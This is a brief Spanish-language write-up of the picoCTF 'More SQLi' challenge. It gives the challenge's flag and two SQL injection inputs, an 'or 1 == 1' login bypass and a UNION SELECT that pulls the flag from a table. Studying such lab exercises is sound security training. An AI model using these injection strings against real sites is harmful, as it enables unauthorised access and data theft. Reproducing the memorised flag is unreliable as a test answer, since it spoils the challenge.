# Reto
More SQLi
## Descripción
Can you find the flag on this website.Try to find the flag [here](http://saturn.picoctf.net:52943/)
## Solución
picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_e3e46aae}
## Notas
Entramos usando la siguiente inyección:
'or 1 == 1; 
Explorando en SQL y sus funciones se realizó la siguiente consulta:
'union select id,flag,3 from more_table;
## Referencias
https://www.youtube.com/watch?v=clMe4yqL6yU&list=PLDo9DMLZyP6kTZ8Td37-LdbAx4-yNfHBl&index=63